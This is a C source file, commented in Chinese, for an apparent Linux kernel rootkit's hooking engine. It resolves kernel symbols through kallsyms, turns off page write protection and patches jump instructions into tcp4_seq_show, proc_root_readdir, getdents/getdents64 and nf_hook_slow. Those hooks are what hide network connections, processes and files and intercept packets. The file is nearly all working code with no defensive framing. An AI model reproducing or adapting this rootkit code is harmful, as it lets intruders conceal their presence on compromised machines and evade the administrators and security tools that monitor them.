/**
 * 钩子机制和函数拦截头文件
 * 实现系统调用和内核函数的钩子功能
 * 支持多种内核版本的兼容性处理
 */

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/fs.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <linux/delay.h>
#include <linux/stop_machine.h>
#include <linux/sched.h>
#include <linux/moduleloader.h>

#include <linux/vmalloc.h>
#include <linux/syscalls.h>
#include <linux/version.h>

#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/in.h>
#include <linux/netfilter.h>
#include <linux/netdevice.h>
#include <net/sock.h>
#include <linux/tcp.h>
#include <linux/inet.h>

// 移除vermagic.h包含，这个头文件只能在内核模块编译时使用
// #include <linux/vermagic.h>

// 添加UTS_RELEASE定义
#include <linux/utsname.h>

// 为新内核定义UTS_RELEASE
#ifndef UTS_RELEASE
#define UTS_RELEASE utsname()->release
#endif

#include "config.h"
#include "util.h"

#include "LDasm.h"
#include "rpkt.h"

//#define HOOK_DEBUG

// 内核版本兼容性处理：nf_hook_slow函数声明
#if (RHEL_MAJOR >= 7 && RHEL_MINOR >= 2)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 12, 0)
extern int ptr_hook_slow(struct sk_buff *skb, struct nf_hook_state *state, const struct nf_hook_entries *e, unsigned int s);
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
// readhat/centos >= 7.2
// Fri Jun 26 2015 Rafael Aquini <aquini@redhat.com> [3.10.0-284.el7]
// int nf_hook_slow(struct sk_buff *skb, struct nf_hook_state *state)
extern int ptr_hook_slow(struct sk_buff *skb, struct nf_hook_state *state);
#endif

#else

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 12, 0)
// 4.13 - 4.20
extern int ptr_hook_slow(struct sk_buff *skb, struct nf_hook_state *state, const struct nf_hook_entries *e, unsigned int s);
#elif LINUX_VERSION_CODE > KERNEL_VERSION(4, 9, 0)
// 4.13 - 4.10
extern int ptr_hook_slow(struct sk_buff *skb, struct nf_hook_state *state, struct nf_hook_entry *entry);
#elif LINUX_VERSION_CODE > KERNEL_VERSION(4, 0, 0)
//  4.9 - 4.1
extern int ptr_hook_slow(struct sk_buff *skb, struct nf_hook_state *state);
#elif LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 22)
// 4.0 - 2.6.22
extern int ptr_hook_slow(u_int8_t pf, unsigned int hook, struct sk_buff *skb, struct net_device *indev, struct net_device *outdev, int (*okfn)(struct sk_buff *), int thresh);
#elif LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 10)
// 2.6.22 - 2.6.11
extern int ptr_hook_slow(int pf, unsigned int hook, struct sk_buff **skb, struct net_device *indev, struct net_device *outdev, int (*okfn)(struct sk_buff *), int thresh);
#endif
#endif

// proc目录读取函数声明
#if LINUX_VERSION_CODE > KERNEL_VERSION(3, 10, 0)
extern int __proc_readdir(struct file *file, struct dir_context *ctx);
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 8)
extern int __proc_readdir(struct file *filp, void *dirent, filldir_t filldir);
#endif

// 系统调用函数声明
extern asmlinkage int __getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
extern asmlinkage int __getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);

// 钩子存根大小
#define STUB_SIZE 80
//---------------------------------------------------------------------
// 钩子表数组 - 存储所有钩子信息
hook_t _tbl[20];		// hooks array

// 套接字错误码定义
#define SK_ERR_socket -1
#define SK_ERR_connect -2

/**
 * 钩子操作结构体
 * 定义钩子操作的函数指针接口
 */
typedef struct _hook_ops_t
{
   void (*init)(hook_t *arrHooks, int index, hook_t *_hook);    // 初始化钩子
   int (*new_stub)(void);                                        // 创建存根
   int (*init_addrs)(void);                                      // 初始化地址
   int (*init_stub)(void);                                       // 初始化存根
   int (*do_hooking)(void);                                      // 执行钩子
   int (*unhooking)(void);                                       // 移除钩子
} hookops;

/**
 * 初始化钩子表项
 * 将钩子信息复制到指定位置
 */
void _init(hook_t *arrHooks, int index, hook_t *_hook)
{
	memcpy((arrHooks + index) , _hook , sizeof(hook_t));
}

// 最大钩子索引
#define MAX_INDEX	5

/**
 * 初始化钩子函数
 * 设置所有需要钩子的函数信息
 */
void init_func(hookops *_hookops)
{

    // TCP序列显示钩子
    hook_t _tcp4_seq_show =
    {
        "tcp4_seq_show",
        NULL,
        v4_seq_show,
        0,
        NULL,
        NULL,
        ATOMIC_INIT(0)
    };
	
    // proc根目录读取钩子
    hook_t _root_readdir =
    {
        "proc_root_readdir",
        NULL,
        __proc_readdir,
        0,
        NULL,
        NULL,
        ATOMIC_INIT(0)
    };

// 内核版本兼容性处理：getdents系统调用
#if (RHEL_MAJOR >= 7 && RHEL_MINOR >= 2)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)

    // 新内核使用__x64_sys_getdents
    hook_t _getdents =
    {	
        "__x64_sys_getdents",	// __x64_sys_getdents , __ia32_sys_getdents
        NULL,
        __getdents,
        0,
        NULL,
        NULL,
        ATOMIC_INIT(0)
    };

    // 新内核使用ksys_getdents64
    hook_t _getdents64 =		
    {
        "ksys_getdents64",
        NULL,
        __getdents64,
        0,
        NULL,
        NULL,
        ATOMIC_INIT(0)
    };
#else

    // 老内核使用sys_getdents
    hook_t _getdents =
    {
        "sys_getdents",
        NULL,
        __getdents,
        0,
        NULL,
        NULL,
        ATOMIC_INIT(0)
    };

    // 老内核使用sys_getdents64
    hook_t _getdents64 =
    {
        "sys_getdents64",
        NULL,
        __getdents64,
        0,
        NULL,
        NULL,
        ATOMIC_INIT(0)
    };
#endif

    // 网络过滤钩子
    hook_t __hook_slow =
    {
		"nf_hook_slow",
        NULL,
		ptr_hook_slow,
        0,
        NULL,
        NULL,
        ATOMIC_INIT(0)
    };

	// 初始化钩子表
	// index 0: TCP序列显示钩子
	_hookops->init(_tbl, 0, &_tcp4_seq_show);
	// index 1: proc根目录读取钩子
	_hookops->init(_tbl, 1, &_root_readdir);
	// index 2: getdents系统调用钩子
	_hookops->init(_tbl, 2, &_getdents);
	// index 3: getdents64系统调用钩子
	_hookops->init(_tbl, 3, &_getdents64);
	// index 4: 网络过滤钩子
	_hookops->init(_tbl, 4, &__hook_slow);
	
}

// 架构相关的跳转指令长度定义
#if defined(__i386__)
#define JMP_OPCODE_LEN (1 + 4)
#elif defined(__x86_64__)
#define JMP_OPCODE_LEN (14)

// x64
#define __LP64__ 1
#else

#endif

/**
 * 修补跳转指令
 * 在目标地址写入跳转到新函数的指令
 * @param dst 目标地址
 * @param f 原始函数地址
 * @param nf 新函数地址
 */
static inline void patch_jump(void *dst, void *f, void *nf)
{
#if defined(__i386__)
	// JMP opcode -- E9.xx.xx.xx.xx  JMP + 5 + xx.xx.xx.xx
	*((unsigned char *)(dst + 0)) = 0xE9;
	*((int *)(dst + 1)) = (long)(nf - (f + 5));
#elif defined(__x86_64__)

// 0xFF 0x25 0x00000000, 		// 0xFF 0x25 00 00 00 00: JMP [RIP+6]
// xx xx xx xx xx xx xx xx   // Absolute destination address
	*((unsigned char *)(dst + 0)) = 0xFF;
	*((unsigned char *)(dst + 1)) = 0x25;
	*((unsigned char *)(dst + 2)) = 0x00;
	*((unsigned char *)(dst + 3)) = 0x00;
	*((unsigned char *)(dst + 4)) = 0x00;
	*((unsigned char *)(dst + 5)) = 0x00;
	
	*((unsigned long *)(dst + 6)) = (unsigned long)nf;
	
#else

#endif
}

/**
 * 初始化操作码
 * 分析目标函数的指令，确定需要备份的指令长度
 * @param s 钩子结构体指针
 * @return 成功返回0，失败返回-1
 */
static int init_opcode(hook_t *s)
{
	s->length = 0;
	
	char *src = (char *)s->target;

	uint32_t all_len = 0;
	uint32_t len = 0;
	ldasm_data ld;
	
	do
	{
		len = insn(src, &ld);

		// 检查指令有效性
		// jmp 0xe9 , 5 size
		// int3 0xCC,  Near return 0xC3, Far return 0xCB, Near return 0xC2(RET imm16)
		if (ld.flags & F_INVALID
			|| (len == 1 && (src[ld.opcd_offset] == 0xCC || src[ld.opcd_offset] == 0xC3))
			|| (len == 3 && src[ld.opcd_offset] == 0xC2)
			|| (len == 5 && src[ld.opcd_offset] == 0xe9)
			)
		{
			debug(" can't copy instruction!\n");

			return -1;
		}
		
		src += len;
		all_len += len;
		
		// 当累积长度达到跳转指令长度时停止
		if (all_len >= JMP_OPCODE_LEN)
		{
			s->length = all_len;
			
			// 备份原始指令
			memcpy(s->stub_bak, s->target, s->length);

			// 在备份指令末尾添加跳转回原始函数的指令
			patch_jump(s->stub_bak + s->length, s->stub_bak + s->length, s->target + s->length);
			
			break;
		}
		
	} while (len < 26);

	return 0;
}

/**
 * 执行钩子操作
 * 将所有钩子函数替换为自定义处理函数
 * @return 成功返回0
 */
int do_hooking(void)
{
	int i;

	hook_t *item = NULL;
	
	// 非Xen环境下禁用页保护
	if(strstr(UTS_RELEASE, "xen") == NULL )
	{
		GPF_DISABLE
	}

	// 遍历所有钩子
	for (i = 0; i < MAX_INDEX; i++)
	{
		item = &_tbl[i];
		if (item->name == NULL)
			continue;
		debug("--> %s hooking \n", item->name);

		if (atomic_read(&item->usage) == 1)
		{
			// 设置页面为可写
			if(strstr(UTS_RELEASE, "xen") == NULL ){
				/// GPF_DISABLE
#if LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 18)
				set_page_rw((unsigned long)item->target_map);
#endif
			}else{
				set_page_rw((unsigned long)item->target_map);
			}

			// 写入跳转指令
			patch_jump(item->target_map, item->target, item->handler);

			// 恢复页面保护
			if(strstr(UTS_RELEASE, "xen") == NULL ){
				///GPF_ENABLE
#if LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 18)
				set_page_ro((unsigned long)item->target_map);
#endif
			}else{
				set_page_ro((unsigned long)item->target_map);
			}

		}
	}
	
	// 恢复页保护
	if(strstr(UTS_RELEASE, "xen") == NULL )
	{
		GPF_ENABLE
	}

	return 0;
}

/**
 * 初始化存根
 * 为每个钩子创建指令备份
 * @return 成功返回0，失败返回-1
 */
int init_stub(void)
{
	int i;

	for (i = 0; i < MAX_INDEX; i++)
	{
		hook_t *s = &_tbl[i];

		if (s->name == NULL)
		{
			//debug(" initalize faile \"%s\" \n", s->name);
			continue;
		}

		if (s->target != NULL)
		{
			s->target_map = s->target;
			debug("target:%px   stub:%px \n", s->target_map, s->stub_bak);

			if (s->target_map != NULL && s->stub_bak != NULL)
			{
				if (init_opcode(s) == 0)
				{
					atomic_inc(&s->usage);
					continue;
				} else {
					return -1;
				}
			}
		}
	}
	
	return 0;
}

/**
 * 初始化地址
 * 通过符号名称获取函数地址
 * @return 成功返回0，失败返回-1
 */
int init_addrs(void)
{
	int i;

	for (i = 0; i < MAX_INDEX; i++)
	{
		hook_t *s = &_tbl[i];

		if (s->name == NULL)
			continue;

		// 通过kallsyms查找函数地址
		s->target = get_symbol_address(s->name);
		debug("get addr %s  %px \n", s->name, s->target);

		if (s->target == NULL)
		{
			return -1;
		}
	}
	
	return 0;
}

/**
 * 初始化钩子系统
 * 按顺序执行所有初始化步骤
 * @param _hookops 钩子操作结构体指针
 * @return 成功返回0，失败返回-1
 */
int init_hooks(hookops *_hookops)
{
	// 创建存根
	_hookops->new_stub();

	// 初始化地址
	if(_hookops->init_addrs() < 0)
		return -1;
		
	// 初始化存根
	if(_hookops->init_stub() < 0)
		return -1;

	// 执行钩子
	_hookops->do_hooking();
	
	return 0;
}

/**
 * 移除钩子
 * 恢复所有被钩子函数为原始状态
 * @return 成功返回0
 */
int unhooking(void)
{
	int i;
	
	// 禁用页保护
	if(strstr(UTS_RELEASE, "xen") == NULL ){
		GPF_DISABLE
	}
	
	// 遍历所有钩子
	for (i = 0; i < MAX_INDEX; i++)
	{
		hook_t *s = &_tbl[i];
		if (atomic_read(&s->usage))
		{
			// 设置页面为可写
			if(strstr(UTS_RELEASE, "xen") == NULL ){
#if LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 18)
				set_page_rw((unsigned long)s->target_map);
#endif
			}else{
				set_page_rw((unsigned long)s->target_map);
			}

			// 恢复原始指令
			memcpy(s->target_map, s->stub_bak, s->length);

			// 恢复页面保护
			if(strstr(UTS_RELEASE, "xen") == NULL ){
#if LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 18)
				set_page_ro((unsigned long)s->target_map);
#endif
			}else{
				set_page_ro((unsigned long)s->target_map);
			}
			
			// 释放存根内存
			vfree(s->stub_bak);
		}
	}
	
	// 恢复页保护
	if(strstr(UTS_RELEASE, "xen") == NULL ){
		GPF_ENABLE
	}
	

	debug("unhooking \n");

	return 0;
}

/**
 * 分配可执行内存
 * 为钩子存根分配具有执行权限的内存
 * @param _size 内存大小
 * @return 分配的内存地址
 */
void *_new(unsigned long _size)
{
	void *_addr = NULL;
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 27)
#if defined(__i386__)
	_addr = __vmalloc(_size, GFP_KERNEL | __GFP_HIGHMEM, __pgprot(_PAGE_KERNEL_EXEC));
#elif defined(__x86_64__)
	_addr = __vmalloc(_size, GFP_KERNEL | __GFP_HIGHMEM, __pgprot(__PAGE_KERNEL_EXEC));
#endif

#elif LINUX_VERSION_CODE >= KERNEL_VERSION(5, 8, 0)
	// 新内核版本，__vmalloc只接受两个参数
	_addr = __vmalloc(_size, GFP_KERNEL | __GFP_HIGHMEM);
#else
	_addr = __vmalloc(_size, GFP_KERNEL | __GFP_HIGHMEM, __pgprot(__PAGE_KERNEL_EXEC));
#endif
	
	return _addr;
}

/**
 * 创建存根
 * 为每个钩子分配存根内存
 * @return 成功返回0
 */
int new_stub(void)
{
	int i;

	for (i = 0; i < MAX_INDEX; i++)
	{
		hook_t *se = &_tbl[i];

		// 分配存根内存
		se->stub_bak = _new(STUB_SIZE);
		
		// 用NOP指令填充内存
		memset(se->stub_bak, 0x90, STUB_SIZE);
		debug("+ new stub %px (%s)\n", se->stub_bak, se->name);
	}

	debug("+ new stub ok\n");

	return 0;
}

// 全局钩子操作结构体
static hookops g_hookops = {
	_init, 
	new_stub,
	init_addrs,
	init_stub,
	do_hooking,
	unhooking
};

// 初始化状态标志
int _true = 0;

/**
 * 初始化函数1
 * 执行钩子系统的初始化
 * @return 成功返回1，失败返回-1
 */
int _init1(void)
{
	if(_true != 0)
	{
		return -1;
	}
	
	// 初始化钩子函数
	init_func(&g_hookops);
	
	// 初始化钩子系统
	if(init_hooks(&g_hookops) == 0)
	{
		_true = 1;
		
		return 1;
	}
	
	return -1;
}

/**
 * 初始化函数2
 * 清理钩子系统
 */
void _init2(void)
{
	if(_true == 1)
		g_hookops.unhooking();
}

